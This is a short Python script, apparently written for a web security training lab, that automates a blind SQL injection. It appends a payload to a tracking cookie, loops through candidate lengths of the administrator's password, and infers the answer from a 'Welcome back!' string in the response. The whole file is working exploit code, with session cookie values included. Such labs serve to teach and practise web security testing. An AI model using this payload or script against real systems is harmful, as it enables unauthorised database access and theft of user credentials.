#This script is a Python-based Blind SQL Injection automation tool. It is used in web security testing / CTF challenges / penetration testing labs to extract sensitive data (like passwords) from a vulnerable web application.
import requests
url = 'https://0aa900d803ddb13681fb024b00d7002f.web-security-academy.net/filter?category=Gifts'


def get_length():
    for i in range(1,101):
        cookie={"TrackingId":'PVHK84vvtyfdMZKn','session':'CRXyFf5AcLGK9pIiwbD05kIkp5GGCTDz'}
        payload=f"' AND LENGTH((SELECT password FROM users WHERE username='administrator'))= {i}--;"
        cookie['TrackingId']+=payload 
        r = requests.get(url,cookies=cookie)
        if "Welcome back!" in r.text:
            return i

length = get_length()
print(f"Password Length : {length}")

